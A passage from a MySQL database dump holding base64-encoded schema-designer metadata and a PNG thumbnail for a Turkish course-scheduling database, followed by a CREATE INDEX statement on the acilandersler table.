2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iWVdOcGJHRnVTM1Z5YzA1diBjMkZoZEVkMWJnPT0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iYWNpbGFuS3Vyc05vIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMSIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImFjaWxhbkt1cnNObyIvPgoJCQkJCQk8L28wPgoJCQkJCQk8bzE+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iWVdOcGJHRnVTM1Z5YzA1diIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJGS19kZXJzcHJvZ3JhbWkiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iRktfZGVyc3Byb2dyYW1pIi8+CgkJCQkJCTwvbzE+CgkJCQkJCTxvMj4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRzIHZhbHVlPSJhMkY1YVhST2J3PT0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iUFJJTUFSWSIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCVFJFRSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjEiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCTwvbzI+CgkJCQkJPC9pbmRleD4KCQkJCQk8bmFtZSB2YWx1ZT0iZGVyc3Byb2dyYW1pIi8+CgkJCQkJPHVuaXF1ZT4KCQkJCQkJPG8wPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iWVdOcGJHRnVTM1Z5YzA1diBjMkZoZEVkMWJnPT0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iYWNpbGFuS3Vyc05vIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iYWNpbGFuS3Vyc05vIi8+CgkJCQkJCTwvbzA+CgkJCQkJCTxvMT4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImEyRjVhWFJPYnc9PSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iUFJJTUFSWSIvPgoJCQkJCQk8L28xPgoJCQkJCTwvdW5pcXVlPgoJCQkJPC9vMz4KCQkJCTxvND4KCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSI0NiIvPgoJCQkJCQk8QXZlcmFnZV9Sb3dfU2l6ZSB2YWx1ZT0iMjczMCIvPgoJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQk8Q3JlYXRlX1RpbWUgdmFsdWU9IjIwMTUtMDItMTYgMTU6NTU6NTYiLz4KCQkJCQkJPEVuZ2luZSB2YWx1ZT0iSW5ub0RCIi8+CgkJCQkJCTxGaWVsZF9Db3VudCB2YWx1ZT0iNSIvPgoJCQkJCQk8SW5kZXhfQ291bnQgdmFsdWU9IjEiLz4KCQkJCQkJPExpbmtfQ291bnQgdmFsdWU9IjEiLz4KCQkJCQkJPE5hbWUgdmFsdWU9Imt1cnNrYXRhbG9nIi8+CgkJCQkJCTxQcmltYXJ5X0tleSB2YWx1ZT0iYTNWeWMwNXYiLz4KCQkJCQkJPFJlY29yZF9Db3VudCB2YWx1ZT0iNiIvPgoJCQkJCQk8U2l6ZSB2YWx1ZT0iMTYuMDAgS2IiLz4KCQkJCQkJPFRyaWdnZXJfQ291bnQgdmFsdWU9IjAiLz4KCQkJCQkJPFVuaXF1ZV9Db3VudCB2YWx1ZT0iMSIvPgoJCQkJCQk8VXBkYXRlX1RpbWUgdmFsdWU9IiIvPgoJCQkJCTwvUHJvcGVydGllcz4KCQkJCQk8Y29udHJvbCB2YWx1ZT0iVGFibGU0Ii8+CgkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCTxmaWVsZD4KCQkJCQkJPG8wPgoJCQkJCQkJPENoYW5nZXMgdmF', NULL, 'iVBORw0KGgoAAAANSUhEUgAAAJkAAABwCAIAAACCdUWnAAAABmJLR0QA/wD/AP+gvaeTAAAgAElEQVR4nO192XMcSXrfl3UfXVV9ohtAAyQBEiBAcobXkDPcnVjtzHolrbTaiZBtWWFboRc/2uFHR+jBf4VfHOHQi9aKsByh9aGVHOGI0Xqk1QxneGhnSIIHSJzdQN/ddR+Z6Ycke0AABAEMjl7u/l7YKFZmV9bXlZX5/b7v9yHf9wVBAAAAsJ3u3PynCA4GFGD29A1dNw6ov19jJyRJIjCwvx88/X82fBF5KVlzzHxMKaUUAAABUACEwOnFGBMzLSOE7G7E86Ab0tZ+KaXVlV42r92+b3/3vX9xlEP6VYaw8Q+EKGAJUYOSaOFx4/6d1uKT9plzucUntqJCrqCbGWnuF02O49I52bAkhOCDH57Y2ilCqFlzC8VURJKjGsiv8bItk5j4cT2M6jIP2YJ848OR8QlrbFK/+u1hAAoIEMDspTylqN0MckMypdDrBtv2e+J01vdjGpMjGcWvAbDJlml1enbyAzvAliYQQiilp82OJEm6rlNK0QtQSluWr+uSJPFra44gcPm8BgDttu84EUJI18UkIaoqrvmLxzSuX0W8ZEtRFJd7whcL0R99O/3f/+IvRkZGHj9+PDw8HIZhFEWGYRQKhevXrwPAz342J8u8JPGKIgCQ+/fXfT85d26oUvHCMBkfl9vtMI6DYlE8pnH9KgLFcdxf+8zNzU1NTzteZOoyIQQA2FPIPjxvgBAAUAoAlH1AiP0J3W5oWTIAdLtBOq0AwJ07dy5fvnzkg/pVRJIkwqZDcUKdCJk6LC0tpdNpQRCSJKGUchxnWVb/NIRgZcWWZZ4QKsuC60YAIIr8vXs1RRF0XWo228Z2S9xf4/Cw2ZaPq84XT+0/fC//8OHDJEkMw7Bte3h4OAiCGzdubDwzivCDB3XTVBwn5HkuCJJSKbW83MtkFMOIMabVqq3rRziUX3lsnmPPnj2bYCzw/P668/1YVUXPizVNBIDbt2//eo49Gmwzx/a8ZLUTTxWl+fl5TdNkWX727BnGuFwuC4KwurpqmubU1NTWvhoNb3GxWyzqtt2xLOXBg0YmoxzJKLbHavVZvbF6qF8hCNK5s+/0VxLHjs22rHXD+4vdqWKxWq2KokgIEQRhdHR0eXl5eHiY4zjXdV/VF6WUmRBjallyp7P91vNo8Pmj/8zzMiGQG3UEgQMAz4kppcxR5dpR32O18fMuEUe42wlShvzVfeHCuUGZeDbb8vSwfnpYB4DvfOc7AMC2lQAwPj4OAKdOnXpVR/m8xnaZG3H7dvVgL3f3QBwFbFGMKHH+95/PhyEujmjNuufZiaLx3XY0NKJyCHkOLQzLi0/sibPWjQ9Hd907PHvUuPqtE0HDP8xB7A2bbdmufbW2/PnUxT/67LPPxsfHG42G53lRFBWLxZmZmf5pH3+8YNvh+LjlOFG5bHY6Acch2w55nlMUodHwikVd08THjx83m83Jycl9XJmqqsPDw/seGMFUUKtAAIB+93dPAQWOB0oBY8rziFKgBHgBcAKCBBevU0lBGO/WS8Vx6PK7Y4QQuu/rOwRstqVunpLkCkKIrWALhUKr1eovjvqYnMw4TqQogizzUYQNQ6IUZFkQBOR5camUohQMQzZN88yZM+VyeR9X9ujRo29iywz8Vt4aVUSOQwAahGGEMeY4TknJ25y9YYr1/IQSqusipbC6audyqqoKAFCreYLIJTGmFBRFYJuxAJx9X+GBY7ORJEWfOP99BHDhwgUAoJSOjIxsfb2Pj1uU0r4L4TmdgoBRK32/QrFYPHny5P6ujOO4/TVkKJWG/65qXjmpktaTp0+fDg8PLy8vx3GcTqeDIOA47gc/+IGmbX4pAECvF3766Uqt5pZKKV3Pz83ZhIQjI6ZpGsvLPUppFOHhYaPTCbJZVRC8b3KRB4vNtnyy5t2vBL/ztnXz5k2EEMdxmqadP39+a8uvvqq1Wj7Pc7LMO04URTiTUVdXe+m0ksmojYanKMJ29+ro8KNLVtaQSfmt8+fPU0qvXbuGMWZzDMZYlrd7QAFMU/7gg1NxjCVJCMPk6tVRjIkgcM2mPzmZ5XkEAJ1OmMupAPCLX6wf5Yh2xmZbDpmCFyCO4yYmJoIgEMVXOlRHR81sVlUUwXXj0VGOEKrroizzmYyKMR0bs5IEr6429n1l6+v7vE31ej2KokKhwHl3XDqu6EMIoSAIoigyTbPT6SRJUigUfN/3fZ/RBvPz88VisVAoAMDiYheAlkpGpWKXSnqSYI5DrZYvCKjTCdjUKkm8bUf7HtohYbMtTU06WxYQQsViEQA8z2OO2a2QZV7TREURcjkIgoQdEQQuirCiCAghQZBWD3eD9xo0q3PZ8vjiysP5+flyuby6usrcy4qiiKKoqqrv+61W6+zZsw8fPgQAZssHD+qtlp/Nqo4TsZU5IdR1YwBIp2XHiS1L5nlOFDnT3P7JPi5s9vsk2uidJf8P381+/PHHlFJRFHO53FtvvbW15YMH9cXFLschQeCCIIkinMkotZpbLKYMQ67XXQDI57v79vswJ9S+BzY3NzdeLqm6dYB7+V4vNE3ZtkPDeG7FwXFsbeP3mRrW0irief7GjRtxHMdx/KppdnTULJctQUBBgEWRI4RKEl+p2KYpxzGens4BwNzcl4c+iFdj3VeGRNJYW1FVFQBc19V1PYoiWZYxxisrK2zTXK1W8/n86OhrNpeLi90giD0vtu2IEFhe7hYKx7oc2ILNtiRxQ45WEbqsqiq7BQDAptlGoyFJkmVZURT5vt9oNIaGhlTVVFWx1wtFkXOciBDKcSiVkna/Vzs8/HyueeWUST1vYWEBYyxJUq/Xy+fzmqZVq9WpqakvvvhidnbW87zl5eXX2jIMk3Y7qFYdNgkRQpvNAXIUwFZbRkG4vnzHzJ/7q7/6q06nMzk52e12kyTJ5/OPHj0aGxvzfZ/neYQQIcT3fbZ1+fjjZ6LIG4acy6kLCx2MSZJQti07RvzL95l5ZjZ6ORjYyvzEiRMAsMtd09RUbuvB27eXv9ElHig23+5UenT87O/KsvzRRx9Vq9WRkRHmxqOUvv/++5RSFoPJJt7+q+j3fm8aALXbfiajdjo+I6IB4M6dylEOZhPuLLpjWbFZeUYIaTabbPlTLBYlSVpeXs5kMrOzs7vv7fHjJuN/ut2wWEwtL3fLZfPwLn4f2GxL3162m0/NdLHX68my3Ov1KKWEEI7jnj17ViqVdF3XX6Yl5+YaiiKk04ogcCsrPUpprxdKEi+KfKfTsW3bMI4nRLbSsLOqIUmS4ziaptm2PTk5ubCwMDo6mk6nn8eL7hqSJHhe7DhRkhAAGBkx4hgfzoXvE5ttSUFt1ZYLY9GtW7fW1tZmZ2e73S4AZDKZRqPx8OHDmZmZt99+u38+IbTXCz0vfviwmc0qmib6fkIpxDEuFPTl5eVqtXrlypWNX9Fut997770jGNvvXCkBAMBLfECpVNpfbydOWCdOWJsO3r69sL/eDgNb/bFD05f/QJKkDz/8sNPppNPpndtzHLp27etVQ5+FZh9s+8LWJfvc3NxBXPnr8X/vdc8MyVxQX1hYSKfTpmk2Go0oiq5evbqDD2QTKIXPPltBCESRp5RKkoAxoRTqdffEidfcnCPGZlvaPl7t0LPDdGVlpd1u93o9Qogoio7jWJbFcdzQ0BA78+HDhijycYwtS+l2A4ypLPPr6y5z/bTbwfFy0QBgCIkuy4DUYrFICNF1PUkSSdobVYkQFAqaZSnNpi+KHEIIYxLH+NKl4TjGryZzjwHbc9GT+fz6+rqqqtVqleO4Xq+XyWSSJImiqG/LdFp99qydTivz821Z5tmk6jiRaRq2HR47Fw0A75zJchwCUPL5PDvS/7AzCKGUUp7nAMDz4pMnMzyP8nktijDGhOMQxyEAxHFobe0Qr3+veCUXffXq1Z1bFot6sbg5Nuv06ezGP4+RiwaAH/+8fnFclfzK4uKiIAjlcnnb6Jat8Lz4Zz9bAIDRUdNxIs+LEQJdlwSBc5yo2w3LZWNtzRkZMQYmPgRgqy2rnfBZPbp2Sn3y5AnP82EYKooiCMIOm7Avv6wxCtN1I0phZaU3OZlptQLTPOaYyvcmlJGc2qxpExMTmqZlMpldNkylpG99a9x1o0xGbbV805RdN9Y0odcLJUkAoK4bz8wUMCbz8wP0YG7ZzhMSBD5CGmNu2VJ+Y2TsVliWTCkEQczznKqK584NJQmenMy4bmTbh3jpr8VoXldEPp/PMwdWFD1nNsIwfBXh1Uc6rQRBIkk820QmCVEUUVVF3489L87l1DgmsrzPaMVDwku2dBwHoaVRCZ48aQuCQCmN41hRlDAMGZOwM2QZCAFGqzAr7hDodQT48d/Xr5xU7eV/7HQ6hJAwDJMkGRsb6/V6juOIovj7v//7OzS/f78eBEkQJK4bmaZCCEkSOj5u9XqBYcgvuOgjG83r8dK1RFHEXDksBwhjzD4zv52u60EQtNvt3eyy7927NzMzE4bhIV33bsC4aBj/VhRF7KfJ1rHtdjuVSm0NfNmEd98tSxJPKU0SwiL5AKDZ9C1rqNeLfgm46F6vx3Ecc9r1XXQYY4xxHMcAsEt3yYkTJ75hkMc3h4YFIOB4jqqqGGNCSKPRUFU1m83yuwjmVlXx2bP28HCK41CS0LU1J5NRRJFrNDxKodsNOQ45jhNF0V73OYeEl2zJ3K19p90mFpr9kAkhr2KnN0KSpDiO9+onO1j84i9r49eMJfd+kiSdTieVSlFKa7XapUuXpqend9EBnZtrzM018nmtVnMJoYoiBEHCvHeUQqGgffzxx+12e2tvR+bb2ohNedGoVCppmuZ5HvstM6oIY7y2tmZZliAIYRh2Op3X9vvFF19cvnw5SY4zL/raHw/zAjcK+7ynCKEf/ODM1uOeF8syH8dEUYQf/vCH23LRR+bb2ojNc2yz2Ww2m2yCZc8WOx7HseM4SZJwHLebp+2tt9469uD8pXY0ZIqh2/U8T5ZlSqnrupqmJUlSqVQKhcLY2NgOky2l9MsvayymiRBardqmKScJQQjFMTYMuf8SHRC8ZEte8v/u7n85KBMQChcn/9nB9LUvMC5ap+7KykoQBGNjY8vLy0mSZLPZbrcbBIFhGLncNqzkC6BuN/C82DTlWs0FgCgivh8riiBJfK/XK5UGSyLlJVtev/rhhdn32PL1mwMhpCjH6ZJ9wUUbY2Nj7Mjp06d33xwheP/958oas7OF/vEXhC4gBM3mQV3sAWDzHLtt+O8vKRgXHTtNx3HiOJZlWRRFtu9qt9tBEKiqOj09nUqltm3uONH8fDsMk0JB43nOdSP2fmGu2kbDGzQuerBm/INFpWG7flyv15mvQJIkFhzrOI6iKJlMBmPcdwZthShygoAsS240fIQQxpQQSggNQyyK3C8BF/0m4TkXPfR1QGh/st0NZFk4d25oQ9ttnsKB5qLfJPzP263ZEYXaq7ZtY4wbjcb3vve93bDQ3W5w61ZVkvhcTm02/SQhiiIoigAAQZDU697wcGp93d0aZnC8eJNtWdRpWuMonwYAQsjODMFGWJZy+nTWdaNSyeB5zrKUXi/QdSkIklRKyue1OMbXro3GMR5o/vKNwdLS0ugoXluifVkbAGAMQV9x6rUb5dXVdQCo1wEANrmWWbbLQa35DwRvrC3DMDRNM45j5l7GGDP7ra+vDw0N8Tzvui4LS9sHHMdZWFg4f/787uOGjgBvrC0xxuvr633pN3ixLySEdDqdb+goVhRllyEKR4k32ZZxHIdhyPP8ppmQRaMlSbJvdzH7KeyQbHMseGNtKYriyZMnGfMqSRLLJWUuWUYYUEobjcb+HlDHcZ4+fbpt+tsx4o21pW3bd+7cYaZiRHT/lcnzPCGE5/lv8lyOj493u518vvD6s48Kb6wtsfTsUe2vD/UrCOZ+b/pPDvUr9oQ31pb/+p/+yQ7+uYPCgEQUMAyQLf/mk//U6i1SCqqOeB5FUfSwdmB3imD+2xf+bSG/z2SSXwoMkC1DWDZSwxiDObTcrPsYcM8hYYA5Hmm6iBB69qg9Mm4QQibPZkVpt6yA78X37lQuvTu+sDj/a1seHeLEwRgQAs8m66t+GMal0ZRrE4GnlIKuK26PSjK/e0MCgKqJ0xdKPI9goESyDgEDZMuwXcoXFQCgTmGsCGOMotgY5FB8/q+3x0BGHsDzIYXeZIIPBsqWb039VosfPZWXRGyvr6+LothsNhFCTDBCVdWpqalNQa3r6w6L3gCAJCGuG7PwHNuOHCekFOKY5PNqs+mPj1udzrPjGNbRYbB+qu2eG8VJEASe5wmCIEkS89qw0MCtjuxCQec45DhROq1IEl8oaK4biyIfBLFpKpalMAHUctk83ujOo8EAPZfwdSazvks5RI5DG+niPgafNz4MDJYtGXusJK2lpaVarfbRRx+9tsncXINl8jpONDWVe/y4qaqiKHIY02bTw5iOjBiaJrJkyjcbg2VLxh5DpBQKhR2jHb/G2JilaWIU4YmJTBzjs2fzjhMbhlSt2m+/XcKY8DwXxzib1Z694a/LAbPlxkzm3dC8GFNF4cfHLXgeTi4wHckgSIaGdPaO7OcwH/bFHzueC3AextKA47i9pgexTGYtrj1+/Ljb7Y6NjRFCTp069SpRrHbbv3t3LYqwrouqKlartqaJ2awqCHyj4YVhEoa4XDZWV+2xMfO4w+gPHcL9Rze/Wv4zkki8kCj6QUY8RAH3wcX/WMhvszZ5Fb47rQ2lVZyMsOdSURTP83aQB8rntRs3xnw/MQyp2w3PnRuKokRVxUbDGx01RJGjFGw7vHChSAidmxuk4JxDgOD67Vw+F7tFQelwcv3zT6qSxKdMmeeR3QsNS3bt2MrI3Y4vCiKhOPRxbkidvbSTiIPdDe/drVy9cWJ9bW1PtsxZqijwkqgCAAvjSKVSO+cwa5rIVGiY0mCvF/STmbvdIEmIacq+nwxaDvNhQAAACmEYryMplkWhfCINlDOzgtvD7WZUGkk11kO3F6uqks4ocYwBkJl5DZluWPLld8f34WZhmcyiu/z5558rioIQ+tGPfrT75pTC48ctAKhUbJ5HMzOFTicQBK7R8IaG9IHKYT4MCJAYlviuxWQZApjqv5g0mCwBABS2KVYK9HV5FCKLUVP39o7659cyKVVC6BxTquuH6uwSCMG3vz3+IhEYOp1wdrbQ6QTXr5cB4M6dAcphPgwIhp4dz19fuemd/Z30rdtfZLPZpaUllmJRqVTOnz8fBAGl9MGDB2NjY7Ozs6ZpYkz+9E/vjo4aY2NWpWKXy2a77XMcJ4pcGCb1ujcyYuRyWhRFP/3pn9XrjU3lDJ4+fbrtpURRFBMOU2p3OpqmOY6TSqUQQrVajVUw2jbxw3Uj141NU0YIlpZ6liWbpowQ6naDIEiaTc+y5OXl7qBpMB8GBAAQNY5LRYiDVColSdKJEyfCMNR1fWhoKAiCQqHguu6lS5dYSgYAcBz67d8+47qRpomqKsQxKZctnkc8j1w3TqVkXRcliTdN/fz581euXDHNzV6YbQWb5+bm/vLz2rUJg3SWKpVKu90uFAp9kfDz589vG/qmKMI//MNKq+WfPZt33ahWc5tNL5NRNU2o1z2EwDTlMMSsmOMgwHF7T57+4mD7RAhNn74sAICk4dFLIUJoamqK5Zb26yRum2qKEBodNQDAdSNFEXkeYUw5DoIgMU1Flnk2LyYJLpfLWw25A/74O8MCzwFcvHjx4i6b8Dz3ve9NbD3uefGVK18r88FxC0f1cfv+//LQ/diXVctFfKTpIrtdUYgJoYoqhH4iiFwcE2UXArwE01bTMy355p2GAAC+23zyi/966Tv/4Sc/+QmTFK3X62zTee3atR1Umn784y/PnMkyIQaE4OTJdBwTAGBFICQJ7bVc35P1cDgt0sjp9Xqs7EQYhpIkMYX73QQwfvnlOkIom1UxJpUKJoQihHq9sFTaPjHv6IEQAaIimiZJMP+g+firbiYvthuxKHGuHftuomg8wVTVBU0XXSf8g3+zk8gt4lBlsZO5PBwmkQAAujmcG/kNAHj//fdZ1OjMzAzHcZ7n7Swg9/3vT2Yyyvx8++LFUhThOMbZrFqve6YpRxG2LPHp09aexnlrvnXllCnH7TAMmXQtCzPffah/HBPLku/dq0sSxxTswhBLEt99RY3yowelgMQOEJsXk9mLQ9PnhyihiEOUAlBgIueUUo5HBNPqsvtatfNzl4YBgLL3JUJcbvwdAOjrFgZB0Gg0XktWnDyZBoDLl4cphUqll89rqirqulSruRyHwnDPnod+JvOGkdM9LWUvXx4GgMnJLHydwPy8hwHR01ZhesR8L4wJIrGAeEEVACCK4yROAIEgC5L09fQzMQMAEASYqdQhBCurdjajapoAAJ1OGEYJsJpU0BQA4FHF+R93Ov/+N4f/z9/8NUtv4ziuXC7fvXtXluXr16+/9p3Xavmtlv/JJ0s8j0ZGTFUVHCfK5fa83Pj5Y/tUXuKizpMnT7LZbBiG+Xx+dXWVyUTxPM9xXLfbPX369MjIyA79PHjQcN1IFPleLxgZMZeXu8xnOwgwDHM9yS224ndLzs9//vNSqYQQ6na7HMclSXL16tWtL7UwxD/96SPf90+fzgIVV1biTifQdTGbNWs1BwBmZgpx7AoAMFnS/tV1EHjugw8+YI15nmdZNaIo8jz/Wm9tNqsoCj89ncOYCgLXbHqplOy6Qb2+t7pB7Z47anEypbIsO47T6XRYnWrDMFzXbbfbpVJJEITXSmZpmhhFCSFEFHnmBhooLvqdCXNmJE7r+XK5jDFmd5jFXm8bpCnL/A9/OB3HRJL4MEwkiU8SwvOo2w2vXBlGCGw76vVAsG379q1bcRwvILQplJvneVbONAj29rJhvwMA2CVv1Uefi963kjbDgOtpU0CIE5hYoKqqURQxNSnLshBCcRz3d9IYk7U1J51WBYFbX3ckic9mVYxppxPEMQmCmFLq+wmrfSMAQCqVMgwjiiJmOdZLEARJkgiCgBBKkmRPiYau6/Z6vX2USmRcNDiV9fV1FiDSaDQymczExMSrfhavymEOw8S2I99PhodTa2sOe7UPCG4/6z6rh98ei27evJnNZlVVZSqDcRzncrkoij788EN2Js9zX31Vw5gahixJnCwLX3xRAYBTpzKLix0AKJVScYyThMgyCGytuG0htP7CYa8TVCqVSqVSfZ2n3eNUFg0ZAlHyLHsSIcQIkx3c65alnDtXcJx4aEhTFMGyFNsOdV2y7ahc5jCmQZBMTGQwJssDsfQBAHh3KnNtkvA8xwoX7Yzf/M2XdGwuXiwBgOfFFy4MwYbd882b6wJCiAmps8JeTAOQLfyY94f9156mWXbyPvLZzo2nOQ5hzJ89e3Y38oMMxWKqWAQA4HlOloVsVgUA05QJoTyPOA4RAhyHBseWtpd0fawj13Vdy7Js246iiFX8S5LE9/2TJ08KghCGycJCJ5NREYJ63eN5xIbmurFtR0zFJJ/Xer0wl9PguQ9PFEVRlGVZEIS+RBqltF6vK4rCdA73ZMsoilzX7e9wdo8+Fx3H8V4Ls2FMb9+u9vW0VVWMooRNKtWqM1Bc9JM1d7Huv3cCHj58mEqlLMtqtVqGYdRqNVZmnT2vsiy0Wv7CQmdqKh8EiWXJd++uG8bzoXleDACEUFUVV1a6ACDEiXf3/uev/Npv8FterKxkc9/bUxPGRQPdg3JLHzyPzp7N67oUBLEsC+12IIpcGOJMRnn77dJAcdGXJ6zLExa8oljKxopV7733/FacOpWGl/fN7Hj/882bq8LU1LRD7hF68BoKJObH96KnAy+4aLad2H2rSsUeGTEAIJ/XWi1f1yWEQNOEKMKWJXMcOnoumhDSbre3Hl9YWACA1tqtdmNJz7/XaDQKhUKn02m326Io5vN5VmJsIz7/fNWylDjGqirWaq5hSEwsyrajbFbleY7nEVNZFPK50g++8+8Of3S7AuOiU0nt1q1bmqa98847uyn/fffu2u3bVYRQu+0bhpwkOAzx1FSu2w00TWQr+CPmos+cOeM4rywLLkglXrBFUQyCYG1tLZvNBkFg27bvb1O4r1QyHCcCQLWam0pJAKAogu/H6bQShjidFjCmzyPTmGLvUeLBgwevOt51AowJIYRJ1xJWKOR1YCcSQlhb9qHZ9DAmrZZHCPtfeuvWrQMdxz7xquF/Q3z22WeDFTfhREiWqNNrA4Cqqp7ntVqtJElGR0eZPmE2m93qUHwRL/n8JbK01MWY6Lq0vu5ms2qj4XU6QSajHvFYdsBXy+5qJ5o2uk+ePBkfH7dtmxH+kiS5rivL8o0bNzaef+tWxXEiAFAUsdn0WIhTrxfW697Zszk2TBi0+Nif3qlfmzBwe6lWqwVBYFkWKyj2ySefMDHfQqFw6dKlnTtpt/3VVZvtoCcmMkz0ld2LAUFWQ3EMuVyO8cTMnHEcs/301kDUsTHLcSJR5FncL0KgaeLqqj0zk3fd+MoVy/fjtbWX60UfDV5VCHpubu70mSnhRbKA53kHK4A6ILWdP/30U9M02SaevuyE2b0g2FY0m81jeC4ppZsEPKIoYhJYtWc/EbRZSSs5juP7vqZpTEMnCIJKpTI0NDQ+Pt6vfLwRnhc/fdpOElIs6pSC40T9QHWeR5I0QAGVLP8QY6zr+sbFTq/XE0VRkqQoinajaM9AKb179+7Fixe3qf19BBgeHn7y5MnGI0EQNJvNQqHQc4LhXL7Vbs/Pz3c6nampKcdxBEHQNC0Mw1qtZprmtrYkhCYJSRLy4EGjXDZdN+Y4oBRYGLTrxpZ1zEX/+qAvdIVY7ES/IEwcx0mShGG414dydnb2eSdHP8e+CnNzc9PT0329M9hQw3ivoC920HTDtnpA5ti//du/ZapRbA+9aSctyzJbxu9+h80cc8fzXO6Af3jiMC661Wr5vq+qat93KMvy6urq2NiYLICmedgAAAQhSURBVMsY406no2laOp1mpPTf//2yZcmCwMkyv7LSEwRe10XXjVIpiee5Ws0dHC6a47hSqSTLcpIkjF1nBfCSJKnVaqqqchyHMd6l7iKllP1GMcaDZcsw8CkVAMD3/V6vVyqVFEVhE5Esy1EURVGUz+crlYplWbIs2y+Kv01P58IQU0obDW9oKEUISRKSy2kstCKVkgaHio7jaGP1ko2FQyilfeZ/98/lxMREt9uVJHGwbPndC8wdrxaLxa3/2ydEt0aU5fPai3NeGc4yIDULFCP+cunP4UAd/ZSg67N/PFjvy0fe0OyIIgS1er2+urpaKpWmpqay2ezrG79Aq+VXKvbSUjeXU1Mp2fNi2w51XTQMOQiWB+F9CQBRFO1j17EzEEIDYcU+XnDRaVmWx8fHKaV73WKm00qvF16+PByGiWUptZo7NKTxPEcp7DHQ5RBxGMprA7f2YVw0gLSxfjxbI+ywpmURpEyRIAiSsTGLZUfHMT55Mk0IFUUOXkhtv8EYLFv2uehKpcKC0rrdLsb4/fff32jdTXj2rFOt2p6XxDF+663i55+vKorA8paWlrqXLpVEkR+02luHgcF6X6Zy5aG0GoV+kiSe55mmyQgTy7J2LqLm+0kQJLou2XaoKEIY4lRK6nQCw5BYpns2q3711T8OyPvyMJAkyWD9Ws2UwvMcx3GmaRqGIQgCISSdTrdaLVb7Z9tWCCEmUyDLPCNGRJETRa5Q0LrdII4JIdR1B8i3fkgYiCeyj//2aePKSTVpPJqbm7Msy/d9FoHHHtNSqfT9739/5x7a7cC2w08/XWER9KYpPXzYLJfNTGZQfHiHh8GaY0fGTqVUCaHNqSAMlNLdCJMQQhECSgEh1On4lqVQSm07evr0/ps9xw6EFftgXHQcer7vM8ZAFEWEULPZDMNQVVWWKW0YxqZl/Zdf1nI5VVUFRRHW112OQxyHwjDRNClJBo6LPiQMli0ZFy14K9Vq1XVdNmEYhtFsNgFA1/UkSdLp9MzMzCZbKgq/vu4EQeK6se8nAJDPq56XqKrA89ygcdGHhAGypeu6H709JPAE0iM7p3EBwCaGr1DgCwWVUgiCRFUFeBHQ7fuxqj4PuZ6fHxif7OFggGy5urqqKAojDZjsPXN0+b7PJlXP8zzP22u3URQFQWCa5kDVhTkMDJAtAUAQBLaPTKVSfZ42DEOWtLS/NRohxHXdPckm/JJigGwZRVG1ur08xNo3qE3I83w+nx+0ek2HgQGypSRJ4+PjTNGZZQnyPM/zfBAEHMexZW1fImb3CIKg0+l8w4TOXwoMkC1Z0i4LLew701laLqW0n5+7V3Act22I0JuHAbJlrXvPnbt3SJ03PTpz6p8cUucDAmHf9ckOHL/xrd9dWXsMhxXNIUxPzQzOYA8cSZL8f7ZY6l8NJBoEAAAAAElFTkSuQmCC', NULL, '2015-05-20 17:18:25', '1' );
-- ---------------------------------------------------------


-- CREATE INDEX "FK_acilandersler" -------------------------
CREATE INDEX `FK_acilandersler` USING BTREE ON `acilandersler`( `dersNo` );
